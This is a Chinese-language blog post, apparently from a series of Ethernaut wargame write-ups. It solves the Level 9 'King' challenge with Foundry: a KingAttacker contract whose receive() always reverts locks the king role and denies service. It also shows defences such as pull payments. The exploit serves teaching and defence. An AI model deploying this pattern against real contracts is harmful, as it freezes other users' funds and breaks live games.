@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          Ethernaut Level 9: King - 拒绝服务攻击 - Kent&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>KENT&#39;S BLOG</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  <h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
+<li><a href="/">首页</a></li>
+<li><a href="/archives">文章归档</a></li>
+<li><a href="/categories">分类浏览</a> </li>
+<li><a href="/tags">标签云</a></li>
+</ul>
+<h2 id="Web3-0-专区"><a href="#Web3-0-专区" class="headerlink" title="Web3.0 专区"></a>Web3.0 专区</h2><ul>
+<li><a href="/categories/Dapp">Dapp 开发</a></li>
+<li><a href="/tags/solidity">智能合约</a></li>
+<li><a href="/tags/blockchain">区块链技术</a></li>
+<li><a href="/categories/Web3%E5%AE%89%E5%85%A8">Web3安全</a></li>
+</ul>
+<h2 id="Ethernaut-系列-🛡️"><a href="#Ethernaut-系列-🛡️" class="headerlink" title="Ethernaut 系列 🛡️"></a>Ethernaut 系列 🛡️</h2><ul>
+<li><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列总览</a></li>
+<li><a href="/2025/01/25/foundry-setup-guide/">Foundry 环境搭建</a></li>
+</ul>
+<h3 id="基础攻击篇-1-10"><a href="#基础攻击篇-1-10" class="headerlink" title="基础攻击篇 (1-10)"></a>基础攻击篇 (1-10)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-01-fallback/">Level 1: Fallback</a></li>
+<li><a href="/2025/01/25/ethernaut-level-02-fallout/">Level 2: Fallout</a></li>
+<li><a href="/2025/01/25/ethernaut-level-03-coinflip/">Level 3: Coin Flip</a></li>
+<li><a href="/2025/01/25/ethernaut-level-04-telephone/">Level 4: Telephone</a></li>
+<li><a href="/2025/01/25/ethernaut-level-05-token/">Level 5: Token</a></li>
+<li><a href="/2025/01/25/ethernaut-level-06-delegation/">Level 6: Delegation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-07-force/">Level 7: Force</a></li>
+<li><a href="/2025/01/25/ethernaut-level-08-vault/">Level 8: Vault</a></li>
+<li><a href="/2025/01/25/ethernaut-level-09-king/">Level 9: King</a></li>
+<li><a href="/2025/01/25/ethernaut-level-10-reentrancy/">Level 10: Re-entrancy</a></li>
+</ul>
+<h3 id="进阶攻击篇-11-20"><a href="#进阶攻击篇-11-20" class="headerlink" title="进阶攻击篇 (11-20)"></a>进阶攻击篇 (11-20)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-11-elevator/">Level 11: Elevator</a></li>
+<li><a href="/2025/01/25/ethernaut-level-12-privacy/">Level 12: Privacy</a></li>
+<li><a href="/2025/01/25/ethernaut-level-13-gatekeeper-one/">Level 13: Gatekeeper One</a></li>
+<li><a href="/2025/01/25/ethernaut-level-14-gatekeeper-two/">Level 14: Gatekeeper Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-15-naught-coin/">Level 15: Naught Coin</a></li>
+<li><a href="/2025/01/25/ethernaut-level-16-preservation/">Level 16: Preservation</a></li>
+<li><a href="/2025/01/25/ethernaut-level-17-recovery/">Level 17: Recovery</a></li>
+<li><a href="/2025/01/25/ethernaut-level-18-magic-number/">Level 18: Magic Number</a></li>
+<li><a href="/2025/01/25/ethernaut-level-19-alien-codex/">Level 19: Alien Codex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-20-denial/">Level 20: Denial</a></li>
+</ul>
+<h3 id="高级攻击篇-21-25"><a href="#高级攻击篇-21-25" class="headerlink" title="高级攻击篇 (21-25)"></a>高级攻击篇 (21-25)</h3><ul>
+<li><a href="/2025/01/25/ethernaut-level-21-shop/">Level 21: Shop</a></li>
+<li><a href="/2025/01/25/ethernaut-level-22-dex/">Level 22: Dex</a></li>
+<li><a href="/2025/01/25/ethernaut-level-23-dex-two/">Level 23: Dex Two</a></li>
+<li><a href="/2025/01/25/ethernaut-level-24-puzzle-wallet/">Level 24: Puzzle Wallet</a></li>
+<li><a href="/2025/01/25/ethernaut-level-25-motorbike/">Level 25: Motorbike</a></li>
+</ul>
+<h2 id="个人页面"><a href="#个人页面" class="headerlink" title="个人页面"></a>个人页面</h2><ul>
+<li><a href="/about">关于我</a></li>
+<li><a href="/repository">项目展示</a></li>
+<li><a href="/books">书单推荐</a></li>
+<li><a href="/links">友情链接</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h1 id="🎯-Ethernaut-Level-9-King-拒绝服务攻击"><a href="#🎯-Ethernaut-Level-9-King-拒绝服务攻击" class="headerlink" title="🎯 Ethernaut Level 9: King - 拒绝服务攻击"></a>🎯 Ethernaut Level 9: King - 拒绝服务攻击</h1><blockquote>
+<p><strong>关卡链接</strong>: <a target="_blank" rel="noopener" href="https://ethernaut.openzeppelin.com/level/9">Ethernaut Level 9 - King</a><br><strong>攻击类型</strong>: 拒绝服务攻击 (DoS)<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>
+</blockquote>
+<h2 id="📋-挑战目标"><a href="#📋-挑战目标" class="headerlink" title="📋 挑战目标"></a>📋 挑战目标</h2><p>谁出资更高的时候，谁就成为 king，目标是让自己成为 king 之后，别人无法夺取王位。换句话说，我们必须成为王者并一直保持国王，然后打破游戏。</p>
+<p><img src="https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg" alt="King Requirements"></p>
+<h2 id="🔍-漏洞分析"><a href="#🔍-漏洞分析" class="headerlink" title="🔍 漏洞分析"></a>🔍 漏洞分析</h2><h3 id="transfer-函数的特性"><a href="#transfer-函数的特性" class="headerlink" title="transfer() 函数的特性"></a>transfer() 函数的特性</h3><p>我们需要理解 <code>transfer</code>（现在基本被弃用）是如何在 Solidity 中工作的：</p>
+<ul>
+<li>如果 <code>transfer</code> 失败，此函数抛出错误，但不返回布尔值</li>
+<li>这意味着如果 <code>transfer</code> 失败，交易将恢复</li>
+<li>Gas 限制为 2300，不足以执行复杂逻辑</li>
+</ul>
+<h3 id="关键漏洞代码"><a href="#关键漏洞代码" class="headerlink" title="关键漏洞代码"></a>关键漏洞代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;= prize || msg.sender == owner);</span><br><span class="line">    payable(king).transfer(msg.value);  // 易受攻击的点</span><br><span class="line">    king = msg.sender;</span><br><span class="line">    prize = msg.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击向量"><a href="#攻击向量" class="headerlink" title="攻击向量"></a>攻击向量</h3><p>我们可以利用 <code>transfer()</code> 函数失败时会回滚的特性：</p>
+<ol>
+<li>部署一个合约成为 king</li>
+<li>合约不定义 <code>receive()</code> 或 <code>fallback()</code> 函数</li>
+<li>或者在 <code>receive()</code> 函数中直接 revert</li>
+<li>这样合约将无法接收 ETH，阻止任何人成为新的 king</li>
+</ol>
+<h2 id="💻-Foundry-实现"><a href="#💻-Foundry-实现" class="headerlink" title="💻 Foundry 实现"></a>💻 Foundry 实现</h2><h3 id="攻击合约代码"><a href="#攻击合约代码" class="headerlink" title="攻击合约代码"></a>攻击合约代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/Ethernaut.sol&quot;;</span><br><span class="line">import &quot;../src/levels/KingFactory.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract KingAttacker &#123;</span><br><span class="line">    King instance;</span><br><span class="line"></span><br><span class="line">    constructor(address payable _king) payable &#123;</span><br><span class="line">        instance = King(_king);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        (bool success, ) = address(instance).call&#123;value: msg.value&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Attack failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 关键：拒绝接收 ETH</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert(&quot;I will always be the king!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract KingTest is Test &#123;</span><br><span class="line">    Ethernaut ethernaut;</span><br><span class="line">    KingFactory kingFactory;</span><br><span class="line">    </span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        ethernaut = new Ethernaut();</span><br><span class="line">        kingFactory = new KingFactory();</span><br><span class="line">        ethernaut.registerLevel(kingFactory);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function testKingExploit() public &#123;</span><br><span class="line">        // 创建关卡实例</span><br><span class="line">        address payable levelInstance = payable(ethernaut.createLevelInstance&#123;value: 1 ether&#125;(kingFactory));</span><br><span class="line">        King instance = King(levelInstance);</span><br><span class="line">        </span><br><span class="line">        // 检查初始状态</span><br><span class="line">        uint256 initialPrize = instance.prize();</span><br><span class="line">        address initialKing = instance._king();</span><br><span class="line">        </span><br><span class="line">        // 部署攻击合约</span><br><span class="line">        KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class="line">        </span><br><span class="line">        // 执行攻击：成为 king</span><br><span class="line">        attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class="line">        </span><br><span class="line">        // 验证攻击成功</span><br><span class="line">        assertEq(instance._king(), address(attacker));</span><br><span class="line">        </span><br><span class="line">        // 尝试有人超越我们（应该失败）</span><br><span class="line">        vm.expectRevert();</span><br><span class="line">        (bool success, ) = levelInstance.call&#123;value: initialPrize + 2&#125;(&quot;&quot;);</span><br><span class="line">        assertFalse(success);</span><br><span class="line">        </span><br><span class="line">        // 验证我们仍然是 king</span><br><span class="line">        assertEq(instance._king(), address(attacker));</span><br><span class="line">        </span><br><span class="line">        // 这个关卡无法正常提交，因为我们破坏了游戏机制</span><br><span class="line">        // 但这正是关卡想要演示的攻击效果</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="关键攻击步骤"><a href="#关键攻击步骤" class="headerlink" title="关键攻击步骤"></a>关键攻击步骤</h3><ol>
+<li><strong>分析当前 prize</strong>：确定需要多少 ETH 成为 king</li>
+<li><strong>部署攻击合约</strong>：合约的 <code>receive()</code> 函数会 revert</li>
+<li><strong>成为 king</strong>：发送足够的 ETH</li>
+<li><strong>锁定王位</strong>：任何后续尝试都会因为 transfer 失败而回滚</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 部署攻击合约</span><br><span class="line">KingAttacker attacker = new KingAttacker&#123;value: initialPrize + 1&#125;(levelInstance);</span><br><span class="line"></span><br><span class="line">// 发送 ETH 成为 king</span><br><span class="line">attacker.attack&#123;value: initialPrize + 1&#125;();</span><br><span class="line"></span><br><span class="line">// 验证攻击成功</span><br><span class="line">assertEq(instance._king(), address(attacker));</span><br></pre></td></tr></table></figure>
+
+<h2 id="🛡️-防御措施"><a href="#🛡️-防御措施" class="headerlink" title="🛡️ 防御措施"></a>🛡️ 防御措施</h2><h3 id="1-使用-Pull-Payment-模式"><a href="#1-使用-Pull-Payment-模式" class="headerlink" title="1. 使用 Pull Payment 模式"></a>1. 使用 Pull Payment 模式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// ❌ 不安全：Push Payment</span><br><span class="line">contract VulnerableKing &#123;</span><br><span class="line">    address public king;</span><br><span class="line">    uint public prize;</span><br><span class="line">    </span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize);</span><br><span class="line">        payable(king).transfer(msg.value);  // 可能失败</span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ✅ 安全：Pull Payment</span><br><span class="line">contract SecureKing &#123;</span><br><span class="line">    address public king;</span><br><span class="line">    uint public prize;</span><br><span class="line">    mapping(address =&gt; uint) public pendingWithdrawals;</span><br><span class="line">    </span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize);</span><br><span class="line">        </span><br><span class="line">        // 记录待提取金额</span><br><span class="line">        if (king != address(0)) &#123;</span><br><span class="line">            pendingWithdrawals[king] += prize;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 让用户自己提取资金</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amount = pendingWithdrawals[msg.sender];</span><br><span class="line">        require(amount &gt; 0, &quot;No funds to withdraw&quot;);</span><br><span class="line">        </span><br><span class="line">        pendingWithdrawals[msg.sender] = 0;</span><br><span class="line">        payable(msg.sender).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用-call-并处理失败"><a href="#2-使用-call-并处理失败" class="headerlink" title="2. 使用 call 并处理失败"></a>2. 使用 call 并处理失败</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract ImprovedKing &#123;</span><br><span class="line">    address public king;</span><br><span class="line">    uint public prize;</span><br><span class="line">    </span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt;= prize);</span><br><span class="line">        </span><br><span class="line">        // 使用 call 并处理失败</span><br><span class="line">        if (king != address(0)) &#123;</span><br><span class="line">            (bool success, ) = payable(king).call&#123;value: prize&#125;(&quot;&quot;);</span><br><span class="line">            if (!success) &#123;</span><br><span class="line">                // 记录失败的支付，让用户手动提取</span><br><span class="line">                pendingWithdrawals[king] += prize;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        king = msg.sender;</span><br><span class="line">        prize = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-实现紧急停止机制"><a href="#3-实现紧急停止机制" class="headerlink" title="3. 实现紧急停止机制"></a>3. 实现紧急停止机制</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">contract SafeKing &#123;</span><br><span class="line">    address public king;</span><br><span class="line">    uint public prize;</span><br><span class="line">    bool public paused;</span><br><span class="line">    address public owner;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier whenNotPaused() &#123;</span><br><span class="line">        require(!paused);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function pause() public onlyOwner &#123;</span><br><span class="line">        paused = true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function unpause() public onlyOwner &#123;</span><br><span class="line">        paused = false;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    receive() external payable whenNotPaused &#123;</span><br><span class="line">        // 正常逻辑</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="🔧-相关工具和技术"><a href="#🔧-相关工具和技术" class="headerlink" title="🔧 相关工具和技术"></a>🔧 相关工具和技术</h2><h3 id="DoS-攻击检测"><a href="#DoS-攻击检测" class="headerlink" title="DoS 攻击检测"></a>DoS 攻击检测</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 检测合约是否能接收 ETH</span><br><span class="line">function canReceiveEther(address target) public returns (bool) &#123;</span><br><span class="line">    (bool success, ) = target.call&#123;value: 1 wei&#125;(&quot;&quot;);</span><br><span class="line">    return success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Gas-限制分析"><a href="#Gas-限制分析" class="headerlink" title="Gas 限制分析"></a>Gas 限制分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 forge 分析 Gas 使用</span></span><br><span class="line">forge <span class="built_in">test</span> --gas-report</span><br><span class="line"></span><br><span class="line"><span class="comment"># 检查 transfer vs call Gas 消耗</span></span><br><span class="line">cast estimate --value 1000000000000000000 &lt;CONTRACT_ADDRESS&gt; <span class="string">&quot;receive()&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>
+<ul>
+<li><code>send</code> 和 <code>transfer</code> 现在已被弃用，即使是 <code>call</code>，使用时最好按照检查-效果-交互模式调用</li>
+<li>外部调用必须谨慎使用，必须正确处理错误</li>
+<li>Push Payment 模式容易受到 DoS 攻击</li>
+</ul>
+<p><strong>攻击向量</strong>:</p>
+<ul>
+<li>通过拒绝接收 ETH 来破坏支付流程</li>
+<li>利用 <code>transfer</code> 失败时的回滚特性</li>
+<li>成为永久的 king，破坏游戏机制</li>
+</ul>
+<p><strong>防御策略</strong>:</p>
+<ul>
+<li>使用 Pull Payment 模式</li>
+<li>正确处理外部调用失败</li>
+<li>实现紧急停止和恢复机制</li>
+<li>避免依赖外部调用的成功</li>
+</ul>
+<hr>
+<h2 id="🔗-相关链接"><a href="#🔗-相关链接" class="headerlink" title="🔗 相关链接"></a>🔗 相关链接</h2><ul>
+<li><strong><a href="/2025/01/25/ethernaut-foundry-solutions-series/">系列目录: Ethernaut Foundry Solutions</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-level-08-vault/">上一关: Level 8 - Vault</a></strong></li>
+<li><strong><a href="/2025/01/25/ethernaut-level-10-reentrancy/">下一关: Level 10 - Re-entrancy</a></strong></li>
+<li><strong><a target="_blank" rel="noopener" href="https://github.com/XuHugo/Ethernaut-Foundry-Solutions">GitHub 项目</a></strong></li>
+</ul>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="K"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>Kent</div>
+      <div>2025-01-25</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/">Web3安全</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/">智能合约</a> <a class="category-link" href="/categories/Web3%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/Ethernaut/">Ethernaut</a>
+
+      <a class="tag-none-link" href="/tags/DoS/" rel="tag">#DoS</a> <a class="tag-none-link" href="/tags/Ethernaut/" rel="tag">#Ethernaut</a> <a class="tag-none-link" href="/tags/Foundry/" rel="tag">#Foundry</a> <a class="tag-none-link" href="/tags/Solidity/" rel="tag">#Solidity</a> <a class="tag-none-link" href="/tags/%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8/" rel="tag">#外部调用</a> <a class="tag-none-link" href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag">#拒绝服务攻击</a> <a class="tag-none-link" href="/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8/" rel="tag">#智能合约安全</a>
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
